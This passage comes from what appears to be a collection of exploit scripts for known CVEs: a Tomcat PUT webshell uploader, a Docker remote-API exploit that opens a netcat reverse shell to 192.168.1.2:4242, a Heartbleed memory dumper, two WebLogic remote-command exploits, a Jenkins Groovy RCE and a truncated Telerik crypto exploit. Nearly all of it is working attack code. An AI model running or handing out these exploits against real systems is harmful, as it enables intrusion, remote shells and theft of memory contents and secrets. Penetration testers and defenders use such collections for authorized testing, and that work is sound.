File\")\n\n(opt,args)=parse.parse_args()\n\nif opt.U==None and opt.P==None and opt.L==None:\n    print(parse.usage)\n    exit(0)\n\n\n\nelse:\n    if opt.U!=None and opt.P==None and opt.L==None:\n        print(bcolors.OKGREEN+banner+bcolors.ENDC)\n        url=str(opt.U)\n        checker=\"Poc.jsp\"\n        print(bcolors.BOLD +\"Poc Filename  {}\".format(checker))\n        createPayload(str(url)+\"/\",checker)\n        con=getContent(str(url)+\"/\",checker)\n        if 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in con:\n            print(bcolors.WARNING+url+' it\\'s Vulnerable to CVE-2017-12617'+bcolors.ENDC)\n            print(bcolors.WARNING+url+\"/\"+checker+bcolors.ENDC)\n\n        else:\n            print('Not Vulnerable to CVE-2017-12617 ')\n    elif opt.P!=None and opt.U!=None and  opt.L==None:\n        print(bcolors.OKGREEN+banner+bcolors.ENDC)\n        pwn=str(opt.P)\n        url=str(opt.U)\n        print(\"Uploading Webshell .....\")\n        pwn=pwn+\".jsp\"\n        RCE(str(url)+\"/\",pwn)\n        shell(str(url),pwn)\n    elif opt.L!=None and opt.P==None and opt.U==None:\n        print(bcolors.OKGREEN+banner+bcolors.ENDC)\n        w=str(opt.L)\n        f=open(w,\"r\")\n        print(\"Scaning hosts in {}\".format(w))\n        checker=\"Poc.jsp\"\n        for i in f.readlines():\n            i=i.strip(\"\\n\")\n            createPayload(str(i)+\"/\",checker)\n            con=getContent(str(i)+\"/\",checker)\n            if 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in con:\n                print(str(i)+\"\\033[91m\"+\" [ Vulnerable ] \"\"\\033[0m\")\n", "CVE Exploits/Docker API RCE.py": "from __future__ import print_function\nimport requests\nimport logging\nimport json\nimport urllib.parse\n\n# NOTE\n# Enable Remote API with the following command\n# /usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock\n# This is an intended feature, remember to filter the port 2375..\n\nname          = \"docker\"\ndescription   = \"Docker RCE via Open Docker API on port 2375\"\nauthor        = \"Swissky\"\n\n# Step 1 - Extract id and name from each container\nip   = \"127.0.0.1\"\nport = \"2375\"\ndata = \"containers/json\"\nurl  = \"http://{}:{}/{}\".format(ip, port, data)\nr = requests.get(url)\n\nif r.json:\n    for container in r.json():\n        container_id   = container['Id']\n        container_name = container['Names'][0].replace('/','')\n        print((container_id, container_name))\n\n        # Step 2 - Prepare command\n        cmd = '[\"nc\", \"192.168.1.2\", \"4242\", \"-e\", \"/bin/sh\"]'\n        data = \"containers/{}/exec\".format(container_name)\n        url = \"http://{}:{}/{}\".format(ip, port, data)\n        post_json = '{ \"AttachStdin\":false,\"AttachStdout\":true,\"AttachStderr\":true, \"Tty\":false, \"Cmd\":'+cmd+' }'\n        post_header = {\n            \"Content-Type\": \"application/json\"\n        }\n        r = requests.post(url, json=json.loads(post_json))\n\n\n        # Step 3 - Execute command\n        id_cmd = r.json()['Id']\n        data = \"exec/{}/start\".format(id_cmd)\n        url = \"http://{}:{}/{}\".format(ip, port, data)\n        post_json = '{ \"Detach\":false,\"Tty\":false}'\n        post_header = {\n            \"Content-Type\": \"application/json\"\n        }\n        r = requests.post(url, json=json.loads(post_json))\n        print(r)", "CVE Exploits/Heartbleed CVE-2014-0160.py": "#!/usr/bin/python\n\n# Quick and dirty demonstration of CVE-2014-0160 originally by Jared Stafford (jspenguin@jspenguin.org)\n# The author disclaims copyright to this source code.\n# Modified by SensePost based on lots of other people's efforts (hard to work out credit via PasteBin)\n\nfrom __future__ import print_function\nfrom builtins import str\nfrom builtins import range\nimport sys\nimport struct\nimport socket\nimport time\nimport select\nimport re\nfrom optparse import OptionParser\nimport smtplib\n\noptions = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')\noptions.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')\noptions.add_option('-n', '--num', type='int', default=1, help='Number of heartbeats to send if vulnerable (defines how much memory you get back) (default: 1)')\noptions.add_option('-f', '--file', type='str', default='dump.bin', help='Filename to write dumped memory too (default: dump.bin)')\noptions.add_option('-q', '--quiet', default=False, help='Do not display the memory dump', action='store_true')\noptions.add_option('-s', '--starttls', action='store_true', default=False, help='Check STARTTLS (smtp only right now)')\n\ndef h2bin(x):\n\treturn x.replace(' ', '').replace('\\n', '').decode('hex')\n\nhello = h2bin('''\n16 03 02 00  dc 01 00 00 d8 03 02 53\n43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf\nbd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00\n00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88\n00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c\nc0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09\nc0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44\nc0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c\nc0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11\n00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04\n03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19\n00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08\n00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13\n00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00\n00 0f 00 01 01\n''')\n\nhbv10 = h2bin('''\n18 03 01 00 03\n01 40 00\n''')\n\nhbv11 = h2bin('''\n18 03 02 00 03\n01 40 00\n''')\n\nhbv12 = h2bin('''\n18 03 03 00 03\n01 40 00\n''')\n\ndef hexdump(s, dumpf, quiet):\n\tdump = open(dumpf,'a')\n\tdump.write(s)\n\tdump.close()\n\tif quiet: return\n\tfor b in range(0, len(s), 16):\n\t\tlin = [c for c in s[b : b + 16]]\n\t\thxdat = ' '.join('%02X' % ord(c) for c in lin)\n\t\tpdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)\n\t\tprint('  %04x: %-48s %s' % (b, hxdat, pdat))\n\tprint()\n\ndef recvall(s, length, timeout=5):\n\tendtime = time.time() + timeout\n\trdata = ''\n\tremain = length\n\twhile remain > 0:\n\t\trtime = endtime - time.time()\n\t\tif rtime < 0:\n\t\t\tif not rdata:\n\t\t\t\treturn None\n\t\t\telse:\n\t\t\t\treturn rdata\n\t\tr, w, e = select.select([s], [], [], 5)\n\t\tif s in r:\n\t\t\tdata = s.recv(remain)\n\t\t\t# EOF?\n\t\t\tif not data:\n\t\t\t\treturn None\n\t\t\trdata += data\n\t\t\tremain -= len(data)\n\treturn rdata\n\ndef recvmsg(s):\n\thdr = recvall(s, 5)\n\tif hdr is None:\n\t\tprint('Unexpected EOF receiving record header - server closed connection')\n\t\treturn None, None, None\n\ttyp, ver, ln = struct.unpack('>BHH', hdr)\n\tpay = recvall(s, ln, 10)\n\tif pay is None:\n\t\tprint('Unexpected EOF receiving record payload - server closed connection')\n\t\treturn None, None, None\n\tprint(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))\n\treturn typ, ver, pay\n\ndef hit_hb(s, dumpf, host, quiet):\n\twhile True:\n\t\ttyp, ver, pay = recvmsg(s)\n\t\tif typ is None:\n\t\t\tprint('No heartbeat response received from '+host+', server likely not vulnerable')\n\t\t\treturn False\n\n\t\tif typ == 24:\n\t\t\tif not quiet: print('Received heartbeat response:')\n\t\t\thexdump(pay, dumpf, quiet)\n\t\t\tif len(pay) > 3:\n\t\t\t\tprint('WARNING: server '+ host +' returned more data than it should - server is vulnerable!')\n\t\t\telse:\n\t\t\t\tprint('Server '+host+' processed malformed heartbeat, but did not return any extra data.')\n\t\t\treturn True\n\n\t\tif typ == 21:\n\t\t\tif not quiet: print('Received alert:')\n\t\t\thexdump(pay, dumpf, quiet)\n\t\t\tprint('Server '+ host +' returned error, likely not vulnerable')\n\t\t\treturn False\n\ndef connect(host, port, quiet):\n\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\tif not quiet: print('Connecting...')\n\tsys.stdout.flush()\n\ts.connect((host, port))\n\treturn s\n\ndef tls(s, quiet):\n\tif not quiet: print('Sending Client Hello...')\n\tsys.stdout.flush()\n\ts.send(hello)\n\tif not quiet: print('Waiting for Server Hello...')\n\tsys.stdout.flush()\n\ndef parseresp(s):\n\twhile True:\n\t\ttyp, ver, pay = recvmsg(s)\n\t\tif typ == None:\n\t\t\tprint('Server closed connection without sending Server Hello.')\n\t\t\treturn 0\n\t\t# Look for server hello done message.\n\t\tif typ == 22 and ord(pay[0]) == 0x0E:\n\t\t\treturn ver\n\ndef check(host, port, dumpf, quiet, starttls):\n\tresponse = False\n\tif starttls:\n\t\ttry:\n\t\t\ts = smtplib.SMTP(host=host,port=port)\n\t\t\ts.ehlo()\n\t\t\ts.starttls()\n\t\texcept smtplib.SMTPException:\n\t\t\tprint('STARTTLS not supported...')\n\t\t\ts.quit()\n\t\t\treturn False\n\t\tprint('STARTTLS supported...')\n\t\ts.quit()\n\t\ts = connect(host, port, quiet)\n\t\ts.settimeout(1)\n\t\ttry:\n\t\t\tre = s.recv(1024)\n\t\t\ts.send('ehlo starttlstest\\r\\n')\n\t\t\tre = s.recv(1024)\n\t\t\ts.send('starttls\\r\\n')\n\t\t\tre = s.recv(1024)\n\t\texcept socket.timeout:\n\t\t\tprint('Timeout issues, going ahead anyway, but it is probably broken ...')\n\t\ttls(s,quiet)\n\telse:\n\t\ts = connect(host, port, quiet)\n\t\ttls(s,quiet)\n\n\tversion = parseresp(s)\n\n\tif version == 0:\n\t\tif not quiet: print(\"Got an error while parsing the response, bailing ...\")\n\t\treturn False\n\telse:\n\t\tversion = version - 0x0300\n\t\tif not quiet: print(\"Server TLS version was 1.%d\\n\" % version)\n\n\tif not quiet: print('Sending heartbeat request...')\n\tsys.stdout.flush()\n\tif (version == 1):\n\t\ts.send(hbv10)\n\t\tresponse = hit_hb(s,dumpf, host, quiet)\n\tif (version == 2):\n\t\ts.send(hbv11)\n\t\tresponse = hit_hb(s,dumpf, host, quiet)\n\tif (version == 3):\n\t\ts.send(hbv12)\n\t\tresponse = hit_hb(s,dumpf, host, quiet)\n\ts.close()\n\treturn response\n\ndef main():\n\topts, args = options.parse_args()\n\tif len(args) < 1:\n\t\toptions.print_help()\n\t\treturn\n\n\tprint('Scanning ' + args[0] + ' on port ' + str(opts.port))\n\tfor i in range(0,opts.num):\n\t\tcheck(args[0], opts.port, opts.file, opts.quiet, opts.starttls)\n\nif __name__ == '__main__':\n\tmain()\n", "CVE Exploits/WebLogic CVE-2016-3510.py": "#!/usr/bin/env python2\n\n#Oracle WebLogic Server Java Object Deserialization RCE (CVE-2016-3510)\n#Based on the PoC by FoxGlove Security (https://github.com/foxglovesec/JavaUnserializeExploits)\n#Made with <3 by @byt3bl33d3r\n\nfrom __future__ import print_function\nimport socket\nimport struct\nimport argparse\nimport os\nimport sys\nfrom subprocess import check_output\n\nysoserial_default_paths = ['./ysoserial.jar', '../ysoserial.jar']\nysoserial_path = None\n\nparser = argparse.ArgumentParser()\nparser.add_argument('target', type=str, help='Target IP:PORT')\nparser.add_argument('command', type=str, help='Command to run on target')\nparser.add_argument('--ysoserial-path', metavar='PATH', type=str, help='Path to ysoserial JAR (default: tries current and previous directory)')\n\nif len(sys.argv) < 2:\n    parser.print_help()\n    sys.exit(1)\n\nargs = parser.parse_args()\n\nif not args.ysoserial_path:\n    for path in ysoserial_default_paths:\n        if os.path.exists(path):\n            ysoserial_path = path\nelse:\n    if os.path.exists(args.ysoserial_path):\n        ysoserial_path = args.ysoserial_path\n\nif len(args.target.split(':')) != 2:\n    print('[-] Target must be in format IP:PORT')\n    sys.exit(1)\n\nif not args.command:\n    print('[-] You must specify a command to run')\n    sys.exit(1)\n\nip, port = args.target.split(':')\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\nprint('[*] Target IP: {}'.format(ip))\nprint('[*] Target PORT: {}'.format(port))\n\nsock.connect((ip, int(port)))\n\n# Send headers\nheaders='t3 12.2.1\\nAS:255\\nHL:19\\nMS:10000000\\nPU:t3://us-l-breens:7001\\n\\n'\nprint('[*] Sending header')\nsock.sendall(headers)\n\ndata = sock.recv(1024)\nprint('[*] Received: \"{}\"'.format(data))\n\npayloadObj = check_output(['java', '-jar', ysoserial_path, 'CommonsCollections1', args.command])\n\npayload = '\\x00\\x00\\x09\\xf3\\x01\\x65\\x01\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x71\\x00\\x00\\xea\\x60\\x00\\x00\\x00\\x18\\x43\\x2e\\xc6\\xa2\\xa6\\x39\\x85\\xb5\\xaf\\x7d\\x63\\xe6\\x43\\x83\\xf4\\x2a\\x6d\\x92\\xc9\\xe9\\xaf\\x0f\\x94\\x72\\x02\\x79\\x73\\x72\\x00\\x78\\x72\\x01\\x78\\x72\\x02\\x78\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x70\\x70\\x70\\x70\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x06\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x01\\x00\\x00'\npayload += payloadObj\npayload += '\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x21\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x65\\x65\\x72\\x49\\x6e\\x66\\x6f\\x58\\x54\\x74\\xf3\\x9b\\xc9\\x08\\xf1\\x02\\x00\\x07\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x5b\\x00\\x08\\x70\\x61\\x63\\x6b\\x61\\x67\\x65\\x73\\x74\\x00\\x27\\x5b\\x4c\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2f\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2f\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2f\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\x3b\\x78\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x49\\x6e\\x66\\x6f\\x97\\x22\\x45\\x51\\x64\\x52\\x46\\x3e\\x02\\x00\\x03\\x5b\\x00\\x08\\x70\\x61\\x63\\x6b\\x61\\x67\\x65\\x73\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0e\\x72\\x65\\x6c\\x65\\x61\\x73\\x65\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x5b\\x00\\x12\\x76\\x65\\x72\\x73\\x69\\x6f\\x6e\\x49\\x6e\\x66\\x6f\\x41\\x73\\x42\\x79\\x74\\x65\\x73\\x74\\x00\\x02\\x5b\\x42\\x78\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x05\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x00\\xff\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x13\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x4a\\x56\\x4d\\x49\\x44\\xdc\\x49\\xc2\\x3e\\xde\\x12\\x1e\\x2a\\x0c\\x00\\x00\\x78\\x70\\x77\\x46\\x21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x09\\x31\\x32\\x37\\x2e\\x30\\x2e\\x31\\x2e\\x31\\x00\\x0b\\x75\\x73\\x2d\\x6c\\x2d\\x62\\x72\\x65\\x65\\x6e\\x73\\xa5\\x3c\\xaf\\xf1\\x00\\x00\\x00\\x07\\x00\\x00\\x1b\\x59\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x78\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x13\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x4a\\x56\\x4d\\x49\\x44\\xdc\\x49\\xc2\\x3e\\xde\\x12\\x1e\\x2a\\x0c\\x00\\x00\\x78\\x70\\x77\\x1d\\x01\\x81\\x40\\x12\\x81\\x34\\xbf\\x42\\x76\\x00\\x09\\x31\\x32\\x37\\x2e\\x30\\x2e\\x31\\x2e\\x31\\xa5\\x3c\\xaf\\xf1\\x00\\x00\\x00\\x00\\x00\\x78'\n\n# adjust header for appropriate message length\npayload = \"{0}{1}\".format(struct.pack('!i', len(payload)), payload[4:])\n\nprint('[*] Sending payload')\nsock.send(payload)\n", "CVE Exploits/WebLogic CVE-2017-10271.py": "from __future__ import print_function\nfrom builtins import input\nimport requests\nimport sys\n\nurl_in = sys.argv[1]\npayload_url = url_in + \"/wls-wsat/CoordinatorPortType\"\npayload_header = {'content-type': 'text/xml'}\n\n\ndef payload_command (command_in):\n    html_escape_table = {\n        \"&\": \"&amp;\",\n        '\"': \"&quot;\",\n        \"'\": \"&apos;\",\n        \">\": \"&gt;\",\n        \"<\": \"&lt;\",\n    }\n    command_filtered = \"<string>\"+\"\".join(html_escape_table.get(c, c) for c in command_in)+\"</string>\"\n    payload_1 = \"<soapenv:Envelope xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\"> \\n\" \\\n                \"   <soapenv:Header> \" \\\n                \"       <work:WorkContext xmlns:work=\\\"http://bea.com/2004/06/soap/workarea/\\\"> \\n\" \\\n                \"           <java version=\\\"1.8.0_151\\\" class=\\\"java.beans.XMLDecoder\\\"> \\n\" \\\n                \"               <void class=\\\"java.lang.ProcessBuilder\\\"> \\n\" \\\n                \"                  <array class=\\\"java.lang.String\\\" length=\\\"3\\\">\" \\\n                \"                      <void index = \\\"0\\\">                       \" \\\n                \"                          <string>cmd</string>                 \" \\\n                \"                      </void>                                    \" \\\n                \"                      <void index = \\\"1\\\">                       \" \\\n                \"                          <string>/c</string>                  \" \\\n                \"                      </void>                                    \" \\\n                \"                      <void index = \\\"2\\\">                       \" \\\n                + command_filtered + \\\n                \"                      </void>                                    \" \\\n                \"                  </array>\" \\\n                \"                  <void method=\\\"start\\\"/>\" \\\n                \"                  </void>\" \\\n                \"            </java>\" \\\n                \"        </work:WorkContext>\" \\\n                \"   </soapenv:Header>\" \\\n                \"   <soapenv:Body/>\" \\\n                \"</soapenv:Envelope>\"\n    return payload_1\n\ndef do_post(command_in):\n    result = requests.post(payload_url, payload_command(command_in ),headers = payload_header)\n\n    if result.status_code == 500:\n        print(\"Command Executed \\n\")\n    else:\n        print(\"Something Went Wrong \\n\")\n\n\n\nprint(\"***************************************************** \\n\" \\\n       \"****************   Coded By 1337g  ****************** \\n\" \\\n       \"*  CVE-2017-10271 Blind Remote Command Execute EXP  * \\n\" \\\n       \"***************************************************** \\n\")\n\nwhile 1:\n    command_in = input(\"Eneter your command here: \")\n    if command_in == \"exit\" : exit(0)\n    do_post(command_in)\n", "CVE Exploits/Jenkins CVE-2016-0792.py": "#! /usr/bin/env python2\n\n#Jenkins Groovy XML RCE (CVE-2016-0792)\n#Note: Although this is listed as a pre-auth RCE, during my testing it only worked if authentication was disabled in Jenkins\n#Made with <3 by @byt3bl33d3r\n\nfrom __future__ import print_function\nimport requests\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nimport argparse\nimport sys\n\nparser = argparse.ArgumentParser()\nparser.add_argument('target', type=str, help='Target IP:PORT')\nparser.add_argument('command', type=str, help='Command to run on target')\nparser.add_argument('--proto', choices={'http', 'https'}, default='http', help='Send exploit over http or https (default: http)')\n\nif len(sys.argv) < 2:\n    parser.print_help()\n    sys.exit(1)\n\nargs = parser.parse_args()\n\nif len(args.target.split(':')) != 2:\n    print('[-] Target must be in format IP:PORT')\n    sys.exit(1)\n\nif not args.command:\n    print('[-] You must specify a command to run')\n    sys.exit(1)\n\nip, port = args.target.split(':')\n\nprint('[*] Target IP: {}'.format(ip))\nprint('[*] Target PORT: {}'.format(port))\n\nxml_formatted = ''\ncommand_list = args.command.split()\nfor cmd in command_list:\n    xml_formatted += '{:>16}<string>{}</string>\\n'.format('', cmd)\n\nxml_payload = '''<map>\n  <entry>\n    <groovy.util.Expando>\n      <expandoProperties>\n        <entry>\n          <string>hashCode</string>\n          <org.codehaus.groovy.runtime.MethodClosure>\n            <delegate class=\"groovy.util.Expando\" reference=\"../../../..\"/>\n            <owner class=\"java.lang.ProcessBuilder\">\n              <command>\n                {}\n              </command>\n              <redirectErrorStream>false</redirectErrorStream>\n            </owner>\n            <resolveStrategy>0</resolveStrategy>\n            <directive>0</directive>\n            <parameterTypes/>\n            <maximumNumberOfParameters>0</maximumNumberOfParameters>\n            <method>start</method>\n          </org.codehaus.groovy.runtime.MethodClosure>\n        </entry>\n      </expandoProperties>\n    </groovy.util.Expando>\n   <int>1</int>\n </entry>\n</map>'''.format(xml_formatted.strip())\n\nprint('[*] Generated XML payload:')\nprint(xml_payload)\nprint() \n\nprint('[*] Sending payload')\nheaders = {'Content-Type': 'text/xml'}\nr = requests.post('{}://{}:{}/createItem?name=rand_dir'.format(args.proto, ip, port), verify=False, headers=headers, data=xml_payload)\n\npaths_in_trace = ['jobs/rand_dir/config.xml', 'jobs\\\\rand_dir\\\\config.xml']\nif r.status_code == 500:\n    for path in paths_in_trace:\n        if path in r.text:\n            print('[+] Command executed successfully')\n            break\n", "CVE Exploits/Telerik CVE-2017-9248.py": "# Author: Paul Taylor / @bao7uo\n\n# https://github.com/bao7uo/dp_crypto/blob/master/dp_crypto.py\n\n# dp_crypto - CVE-2017-9248 exploit\n# Telerik.Web.UI.dll Cryptographic compromise\n\n# Warning - no cert warnings,\n# and verify = False in code below prevents verification\n\nimport sys\nimport base64\nimport requests\nimport re\nimport binascii\nimport argparse\n\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nrequests_sent = 0\nchar_requests = 0\n\n\ndef getProxy(proxy):\n    return { \"http\" : proxy, \"https\" : proxy }\n\n\ndef get_result(plaintext, key, session, pad_chars):\n    global requests_sent, char_requests\n\n    url = args.url\n    base_pad = (len(key) % 4)\n    base = '' if base_pad == 0 else pad_chars[0:4 - base_pad]\n    dp_encrypted = base64.b64encode(\n                                (encrypt(plaintext, key) + base).encode()\n                            ).decode()\n    request = requests.Request('GET', url + '?dp=' + dp_encrypted)\n    request = request.prepare()\n    response = session.send(request, verify=False, proxies = getProxy(args.proxy))\n    requests_sent += 1\n    char_requests += 1\n\n    match = re.search(\"(Error Message:)(.+\\n*.+)(</div>)\", response.text)\n    return True \\\n        if match is not None \\\n        and match.group(2) == args.oracle \\\n        else False\n\ndef test_keychar(keychar, found, session, pad_chars):\n    base64chars = [\n                    \"A\", \"Q\", \"g\", \"w\", \"B\", \"R\", \"h\", \"x\", \"C\", \"S\", \"i\", \"y\",\n                    \"D\", \"T\", \"j\", \"z\", \"E\", \"U\", \"k\", \"0\", \"F\", \"V\", \"l\", \"1\",\n                    \"G\", \"W\", \"m\", \"2\", \"H\", \"X\", \"n\", \"3\", \"I\", \"Y\", \"o\", \"4\",\n                    \"J\", \"Z\", \"p\", \"5\", \"K\", \"a\", \"q\", \"6\", \"L\", \"b\", \"r\", \"7\",\n                    \"M\", \"c\", \"s\", \"8\", \"N\", \"d\", \"t\", \"9\", \"O\", \"e\", \"u\", \"+\",\n                    \"P\", \"f\", \"v\", \"/\"\n                  ]\n\n    duff = False\n    accuracy_thoroughness_threshold = args.accuracy\n    for bc in range(int(accuracy_thoroughness_threshold)):\n                                                # ^^ max is len(base64chars)\n        sys.stdout.write(\"\\b\\b\" + base64chars[bc] + \"]\")\n        sys.stdout.flush()\n        if not get_result(\n                      base64chars[0] * len(found) + base64chars[bc],\n                      found + keychar, session, pad_chars\n                      ):\n            duff = True\n            break\n    return False if duff else True\n\n\ndef encrypt(dpdata, key):\n    encrypted = []\n    k = 0\n    for i in range(len(dpdata)):\n        encrypted.append(chr(ord(dpdata[i]) ^ ord(key[k])))\n        k = 0 if k >= len(key) - 1 else k + 1\n    return ''.join(str(e) for e in 